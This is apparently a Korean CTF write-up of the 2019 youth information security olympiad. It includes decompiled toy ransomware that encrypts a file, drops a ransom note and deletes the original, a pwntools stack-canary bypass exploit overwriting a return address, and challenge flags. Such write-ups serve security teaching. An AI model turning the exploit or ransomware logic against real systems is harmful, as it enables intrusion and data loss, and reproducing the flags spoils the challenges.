---
title: "2019 제 14회 중고생정보보호올림피아드 풀이"
date: 2019-9-21
tags: [정보보호올림피아드,Olymipad]
categories: [CTF]
---

![](https://user-images.githubusercontent.com/32904385/65372502-3862de80-dcac-11e9-87e8-fcd23ded1afe.png)

2019.9.21 9:30 ~ 5:00 까지 진행했습니다. 문제는 총 10개였습니다.

![](https://user-images.githubusercontent.com/32904385/65372531-9b547580-dcac-11e9-8fbc-b25404f85535.png)

## Q1

![](https://user-images.githubusercontent.com/32904385/65372552-e4a4c500-dcac-11e9-91ae-39e698f5a181.png)

Web문제인데 Web + Cryptography 섞어놓은듯한 문제다.

풀이를 들은 바로는 Q1에서 니힐리스트 암호를 풀고 다음으로 넘어가면 magic hash를 풀면 Q2로 넘어간다.

Q2에서는 스크립트 주는데 hex 값으로 바꾸면 자스 코드가 나온다. 이 자스 코드를 Console에 넣으면 키가 나온다.

이 키를 서버로 전송할 때 3글자 제한으로 짤려서 보내지는데 길이 제한을 바꿔서 보내주면 된다고 한다.

## Q2

![](https://user-images.githubusercontent.com/32904385/65372542-c6d76000-dcac-11e9-99b5-9b1333b6eef3.png)

Randsomware Reversing 문제이다. 끝나고 풀었다 ㅎ,ㅎ,

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned __int16 v4; // [rsp+2Eh] [rbp-92h]
  unsigned __int8 v5; // [rsp+30h] [rbp-90h]
  unsigned __int8 v6; // [rsp+31h] [rbp-8Fh]
  unsigned __int8 v7; // [rsp+32h] [rbp-8Eh]
  unsigned __int8 v8; // [rsp+33h] [rbp-8Dh]
  char Dest[8]; // [rsp+40h] [rbp-80h]
  char Filename; // [rsp+50h] [rbp-70h]
  FILE *v11; // [rsp+90h] [rbp-30h]
  char *Str; // [rsp+98h] [rbp-28h]
  char *v13; // [rsp+A0h] [rbp-20h]
  FILE *v14; // [rsp+A8h] [rbp-18h]
  char *v15; // [rsp+B0h] [rbp-10h]
  FILE *File; // [rsp+B8h] [rbp-8h]

  _main();
  printf("input file name\n>>> ");
  scanf("%s", &Filename);
  File = fopen(&Filename, "rb");
  if ( File )
  {
    strcpy(Dest, "Encrypted_");
    v15 = strcat(Dest, &Filename);
    printf("\nencrypted file name : \n\t%s\n", v15);
    v14 = fopen(v15, "wb");
    v5 = dec_to_hex(12i64);
    v6 = dec_to_hex(1i64);
    v7 = dec_to_hex(95i64);
    v8 = dec_to_hex(19i64);
    while ( fscanf(File, "%c", &v4) != -1 )
    {
      v4 += v5;
      v4 ^= v6;
      v4 ^= v7;
      v4 -= v8;
      fputc(v4, v14);
    }
    printf("\nsuccess");
    v13 = "_README.txt";
    Str = "Oops, Your files have been encrypted.\n"
          "\n"
          "If you see this text, your files are no longer accessible.\n"
          "You might have been looking for a way to recover your files.\n"
          "Don't waste your time. No one will be able to recover them without\n"
          "decryption service.";
    v11 = fopen("_README.txt", "w");
    fputs(Str, v11);
    fclose(File);
    remove(&Filename);
  }
  else
  {
    printf("\nerror : not found");
    fclose(File);
  }
  return 0;
}
```

이렇게 파일 1bytes씩 연산을 하는데 역연산 해주면 된다. 

Encrypt 파일을 1bytes씩 역연산해줘서 새로운 파일을 쓰면 된다.

```c
#include <stdio.h>

int dec_to_hex(unsigned int a1){
   return (unsigned int)(16 * (a1 / 0xAu) + a1 % 0xAu);
}

int main(){
   unsigned int v4; // [rsp+2Eh] [rbp-92h]
   unsigned int v5; // [rsp+30h] [rbp-90h]
   unsigned int v6; // [rsp+31h] [rbp-8Fh]
   unsigned int v7; // [rsp+32h] [rbp-8Eh]
   unsigned int v8;
   FILE * v14;
   FILE *File;

   File = fopen("Encrypt.exe", "rb");

   v14 = fopen("Decrypt.exe", "wb");
   v5 = dec_to_hex(12u);
   v6 = dec_to_hex(1u);
   v7 = dec_to_hex(95u);
   v8 = dec_to_hex(19u);
   
   while (fscanf(File, "%c", &v4) != -1)
   {
      v4 += v8;
      v4 ^= v7;
      v4 ^= v6;
      v4 -= v5;
      fputc(v4, v14);
   }
   return 0;
}
```

그러면 새로운 `Decrypt.exe` 파일이 생긴다. 

```c
int __fastcall sub_1400030F0(__int64 a1)
{
  __int64 v1; // rbx
  int v2; // edi
  int v3; // eax
  UINT v4; // er9
  const CHAR *v5; // r8
  const CHAR *v6; // rdx

  v1 = a1;
  v2 = sub_14002B0D0(a1, 1000i64, 0i64, 1i64);
  v3 = sub_14002B0D0(v1, 1001i64, 0i64, 1i64);
  if ( (v2 - 10000) > 89999 || (v3 - 10000) > 89999 )
  {
    v6 = "nono! number length chack!!";
    goto LABEL_10;
  }
  if ( ((v2 + v3 * (v2 - 1) - 3 * (v3 / 2)) ^ 0xAAEFEAE) != 0x1AE9AA40 )
  {
    v6 = "oh..no number u_u";
LABEL_10:
    v4 = 16;
    v5 = "oh...";
    return MessageBoxA(0i64, v6, v5, v4);
  }
  if ( (v2 - 26000) >= 1000 || (v3 - 10000) >= 1000 )
  {
    MessageBoxA(0i64, "Other than this number.", "Not this..", 0x30u);
    v4 = 64;
    v5 = "Not this..";
    v6 = &unk_140230A40;
  }
  else
  {
    MessageBoxA(0i64, "yesyes! number!!", "OK", 0x40u);
    v4 = 64;
    v5 = "OK";
    v6 = &unk_1402309D0;
  }
  return MessageBoxA(0i64, v6, v5, v4);
}
```

v2는 Serial 앞 글자 v3는 Serial 뒷 글자이므로 저 수식에 만족하도록 한후 `yesyes! number!!` 메시지 박스 띄워주면 된다.

```c
for i in range(10000,99999):
	print i
	for j in range(10000,99999):
		if (((i + j * (i - 1) - 3 * (j / 2)) ^ 0xAAEFEAE) == 453021088):
			print 'Serial : ' + str(i) + '-' + str(j)
print 'Finish'
```

이렇게 돌리면 Serial이 4개 나온다. 이 중에서 맞춰서 넣으면 된다.

Serial 앞자리는 46442 뒷자리는 98872 이렇게 넣어주면 OK 뜬다. 

**FLAG : `4644298872`**

## Q3

![](https://user-images.githubusercontent.com/32904385/65372545-cb9c1400-dcac-11e9-98a7-937a2841e558.png)

Apk 파일을 준다.

## Q4

First Blood한 Reversing 문제다.

```
q4: ELF 64-bit LSB shared object x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=d0a485ffb13e19abe4bd3ca6d39f816ec30901f4, not stripped
```

ELF 64비트 파일이다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // edx
  int v4; // ecx
  int v5; // er8
  int v6; // er9
  unsigned int i; // [rsp+8h] [rbp-68h]
  unsigned int j; // [rsp+Ch] [rbp-64h]
  unsigned int v10; // [rsp+10h] [rbp-60h]
  unsigned int v11; // [rsp+14h] [rbp-5Ch]
  unsigned int v12; // [rsp+18h] [rbp-58h]
  unsigned int v13; // [rsp+1Ch] [rbp-54h]
  unsigned int v14; // [rsp+20h] [rbp-50h]
  unsigned int v15; // [rsp+24h] [rbp-4Ch]
  unsigned int v16; // [rsp+28h] [rbp-48h]
  unsigned int v17; // [rsp+2Ch] [rbp-44h]
  unsigned int v18; // [rsp+30h] [rbp-40h]
  unsigned int v19; // [rsp+34h] [rbp-3Ch]
  unsigned int v20; // [rsp+38h] [rbp-38h]
  unsigned int v21; // [rsp+3Ch] [rbp-34h]
  unsigned __int64 v22; // [rsp+48h] [rbp-28h]

  v22 = __readfsqword(0x28u);
  puts(" [*] Please enjoy yourself.");
  fflush(_bss_start);
  for(i = 0; i <= 0xB; ++i )
  {
    printf(" Input[%d] : ", i);
    fflush(_bss_start);
    argv = (&v10 + i);
    __isoc99_scanf("%u", argv);
  }
  if ( Verify_Solution(&v10, argv, v3, v4, v5, v6) )
  {
    for ( j = 0; j <= 0xB; ++j )
      *(&v10 + j) ^= 0xAu;
    v15 ^= 0x73u;
    printf(" [+] flag { %c%c%c%c%c%c%c%c%c%c%c%c }\n", v10, v11, v12, v13, v14, v15, v16, v17, v18, v19, v20, v21);
  }
  else
  {
    puts(" [-] Do not be modest!!!");
  }
  return 0;
}
```

메인을 보게되면 입력한 값을 어떠한 함수를 걸쳐 연산해서 플래그를 내뿜는거 같다.

그냥 `Verify_Solution`  함수의 리턴 값만 True로 맞춰주면 될 것 같다. 

이 함수를 Decompile 하려고 하면 안되는데 SP value 바꿔주면 된다.

바꿔주면 방정식들이 나오는데 SMT solver로 풀어주면 된다.

```python
from z3 import *

s = Solver()
a1 = [BitVec('a%i'%i,32) for i in range(12)]

s.add(37485 * a1[0]
+ 29554 * a1[6]
+ 16388 * a1[7]
+ 57693 * a1[8]
+ 14626 * a1[9]
+ 39342 * a1[11]
+ 21090 * a1[10]
+ 50633 * a1[4]
+ 43166 * a1[5]
- 21621 * a1[1]
- 1874 * a1[2]
- 46273 * a1[3] == 18087985)

s.add(4809 * a1[1]
+ 22599 * a1[5]
+ 14794 * a1[4]
+ 50936 * a1[0]
+ 38962 * a1[3]
- 6019 * a1[2]
- 837 * a1[6]
- 36727 * a1[7]
- 50592 * a1[8]
- 11829 * a1[9]
- 20046 * a1[10]
- 9256 * a1[11] == 4292548406)

s.add(26907 * a1[3]
+ 17702 * a1[8]
+ 5371 * a1[11]
+ 42654 * a1[10]
+ 52943 * a1[1]
- 38730 * a1[0]
- 16882 * a1[2]
- 44446 * a1[4]
- 18601 * a1[5]
- 65221 * a1[6]
- 47543 * a1[7]
- 33910 * a1[9] == 4286707107)

s.add(57747 * a1[0]
+ 8621 * a1[10]
+ 34805 * a1[7]
+ 54317 * a1[4]
+ 10649 * a1[6]
- 23889 * a1[1]
- 26016 * a1[2]
- 25170 * a1[3]
- 32337 * a1[5]
- 9171 * a1[8]
- 22855 * a1[9]
- 634 * a1[11] == 2860700)

s.add(43964 * a1[2]
+ 34670 * a1[3]
+ 54889 * a1[4]
+ 28134 * a1[8]
+ 15578 * a1[11]
+ 43186 * a1[9]
+ 16323 * a1[1]
- 14005 * a1[0]
- 6141 * a1[5]
- 35427 * a1[6]
- 61977 * a1[7]
- 59676 * a1[10] == 7588953)

s.add(39603 * a1[6]
+ 13602 * a1[7]
+ 10305 * a1[11]
+ 29341 * a1[10]
+ -40760 * a1[0]
+ 13608 * a1[2]
- 22014 * a1[1]
- 4946 * a1[3]
- 26750 * a1[4]
- 31708 * a1[5]
- 59055 * a1[8]
- 32738 * a1[9] == 4285324349)

s.add(57856 * a1[1]
+ 16047 * a1[9]
+ 55241 * a1[7]
+ -47499 * a1[0]
+ 13477 * a1[2]
- 10219 * a1[3]
- 5032 * a1[4]
- 21039 * a1[5]
- 29607 * a1[6]
- 6065 * a1[8]
- 4554 * a1[10]
- 2262 * a1[11] == 1200729)

s.add(17175 * a1[1]
+ 41178 * a1[11]
+ 47909 * a1[7]
+ -65419 * a1[0]
+ 53309 * a1[6]
- 9410 * a1[2]
- 22514 * a1[3]
- 52377 * a1[4]
- 9235 * a1[5]
- 59111 * a1[8]
- 41289 * a1[9]
- 24422 * a1[10] == -16028930)

s.add(33381 * a1[3]
+ 46767 * a1[4]
+ 15699 * a1[10]
+ 58551 * a1[5]
+ 4135 * a1[1]
+ 1805 * a1[0]
- 16900 * a1[2]
- 34118 * a1[6]
- 44920 * a1[7]
- 11933 * a1[8]
- 20530 * a1[9]
- 36597 * a1[11] == 185252)

s.add(41284 * a1[3]
+ 47052 * a1[6]
+ 42363 * a1[7]
+ 15033 * a1[8]
+ 10788 * a1[10]
+ 18975 * a1[9]
+ 61056 * a1[1]
- 42941 * a1[0]
- 45169 * a1[2]
- 1722 * a1[4]
- 26423 * a1[5]
- 33319 * a1[11] == 8414043)

s.add(12587 * a1[6]
+ 58786 * a1[7]
+ 30753 * a1[10]
+ 22613 * a1[9]
+ -37085 * a1[0]
+ 12746 * a1[5]
- 51590 * a1[1]
- 17798 * a1[2]
- 10127 * a1[3]
- 52388 * a1[4]
- 8269 * a1[8]
- 20853 * a1[11] == 4290501167)

s.add(47566 * a1[1]
+ 9228 * a1[5]
+ 48719 * a1[8]
+ 57612 * a1[11]
+ 47348 * a1[9]
+ 36650 * a1[0]
+ 65196 * a1[4]
- 33282 * a1[2]
- 59180 * a1[3]
- 59599 * a1[6]
- 62888 * a1[7]
- 37592 * a1[10] == 3707996)

print s.check()
print s.model()

a1 = [68,58,90,93,100,38,68,69,108,95,100,43]

flag = ''
for i in range(len(a1)):
	if i != 5:
		flag += chr(a1[i]^0xa)
	else:
		flag += chr(a1[i]^0xa^0x73)

print 'FLAG is ' + flag
```

**FLAG : `N0PWn_NOfUn!`**

<br />

## Q5

네트워크 문제이다. 

Client.exe 파일도 주어지는데 나는 그냥 터미널의 netcat을 이용해서 풀었다.

ip와 port가 주어지는데 wireshark 패킷 캡쳐를 켜놓고 `nc 1.209.148.228 5050` 에 접속한 후 AAA를 입력하고 패킷을 보면 내가 보낸 패킷 AAA가 보내진 TCP Stream을 볼 수 있다. 그리고 다음 스트림을 보면 아래와 같은 스트림이 존재 했다.

![](https://user-images.githubusercontent.com/32904385/65372554-e8d0e280-dcac-11e9-8ce2-eb2ff370dcfb.png)

여기서 주어진 1.209.148.228:6893으로 접속하게 되면 ID랑 Key를 입력하는 창을 볼 수 있는데 ID에는 `user88`, Key에는 `FGDQeCYJnnFXwy69` 를 입력해주면 된다.

![](https://user-images.githubusercontent.com/32904385/65372555-ea020f80-dcac-11e9-814f-793b1343be30.png)

**FLAG : `9NHrJZQSi8mjG47r`**

<br />

## Q6

![](https://user-images.githubusercontent.com/32904385/65372514-621c0580-dcac-11e9-8d2c-cbd6997d6f45.png)

이건 Forensic PNG LSB문제 같은데 복구하라는거 같다.

추후에 풀겠슴니다.

## Q7

![](https://user-images.githubusercontent.com/32904385/65372534-a27b8380-dcac-11e9-8330-922ffcc4fbbe.png)

swift로 만들어진 .app 파일을 준다.

추후에 풀겠슴니다.



## Q8

![](https://user-images.githubusercontent.com/32904385/65372533-a0192980-dcac-11e9-9a0e-7a0f765e60aa.png)

Unity Reversing 문제이다.

추후에 풀겠슴니다.

## Q9

![](https://user-images.githubusercontent.com/32904385/65372516-647e5f80-dcac-11e9-8e96-5f9d7e23bf2a.png)

full relro, nx, pie가 걸려있고 따로 custom canary가 존재한다.
여기서 canary는 srand(time(0))로 rand값 가져오지만 scanf(%d,var[i])처럼 i 범위를 넘어서 카나리 값을 입력할 수 있을때 원래는 숫자만 가능하지만 문자가 입력되면 문자가 버퍼에 남아 %d를 통과하지만 +,-는 예외다. 버퍼에남지도 않고 해당 변수에 아무 값도 저장하지 않으므로 Canary bypass가 가능하다. 그래서 카나리를 손상시키지않고 return addresss만 변조시킬수 있다.

```c
int coal_mine()
{
  unsigned int v0; // eax
  int v2[16]; // [esp+8h] [ebp-60h]
  char name; // [esp+48h] [ebp-20h]
  int v4; // [esp+58h] [ebp-10h]
  int i; // [esp+5Ch] [ebp-Ch]

  memset(v2, 0, sizeof(v2));
  v0 = time(0);
  srand(v0);
  my_canary = rand();
  v2[0] = my_canary;
  v4 = 10;
  printf("Mine worker ID : ");
  fflush(stdout);
  __isoc99_scanf("%24s", &name);
  for ( i = 0; i < v4; ++i )
  {
    printf("Mineral%d : ", i + 1);
    fflush(stdout);
    __isoc99_scanf("%u", &v2[i]);
  }
  for ( i = 0; i < v4; ++i )
    printf("%d. 0x%08u\n", i, v2[i]);
  if ( v2[0] != my_canary )
  {
    puts("you can't escape my coal mine ..");
    exit(0);
  }
  return puts("my canaria is uninfected. i'm safety !");
}
```

v4를 조작해서 ebp-60에서 리턴 위치인 ebp+4까지 갈 수 있는 크기를 만들어주고 Canary는 +,-로 bypass해주면 된다.
마지막 ebp+4의 값은 treasure위치로 바꿔주면 된다. 그러면 treasure로 가서 flag를 딸 수있다.

```python
from pwn import *

#context.log_level = 'debug'
e = ELF('./coal_mine')
p = process('./coal_mine')

p.recvuntil('GOAL(')
magic = int(p.recv(10),16)
log.info('treasure : ' + hex(magic))

p.sendlineafter(': ','A'*16 + p32(26))
p.sendlineafter(':','+')
for i in range(24):
    p.sendlineafter(':','+')
p.sendlineafter(':',str(magic))
p.interactive()
```

**FLAG : `??????`**

<br />

## Q10

시작하자마자 2분만에 푼 문제인데 구글링 검색 문제였다. 취약점 발생한 CVE 찾으면 된다. IOS에서 뭐 보안결함 발생했는데 제대로 보완 안해서 다시 터졌다고  해서 그거 연관된 CVE랑 검색했는데 나왔다. 

![](https://user-images.githubusercontent.com/32904385/65372643-b4a9f180-dcad-11e9-9636-1c6efa763e1f.png)

**FLAG : `CVE-2019-5431`**